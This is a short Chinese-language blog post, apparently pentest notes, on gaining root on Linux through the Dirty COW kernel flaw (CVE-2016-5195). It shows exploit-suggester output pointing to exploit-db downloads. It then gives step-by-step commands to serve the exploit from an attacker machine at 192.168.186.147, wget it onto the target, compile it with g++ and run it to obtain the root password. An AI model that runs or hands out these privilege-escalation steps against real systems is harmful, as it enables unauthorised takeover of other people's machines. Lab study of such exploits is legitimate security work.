https://blog.csdn.net/hbhgyu/article/details/106245182

向只读文件写入数据

```
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: 
	   debian=7|8,
	   RHEL=5{kernel:2.6.(18|24|33)-*},
	   RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},
	   RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},
	   [ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```

### 40611

```
[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```


### 40847

需求：

g++编译器

首先进入tmp目录，然后开启http服务，选用80端口

```bash
python -m http.server 80
```

 3、在目标主机下载40847.cpp文件，并进行编译成40847可执行文件

```bash
wget http://192.168.186.147:80/40847.cpp
```

```
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
```

 4、执行该文件，可以得到root用户对应的密码！！

```bash
chmod +x dcow
./dcow -s    (Will automatically do "echo 0 > /proc/sys/vm/dirty_writeback_centisecs")

```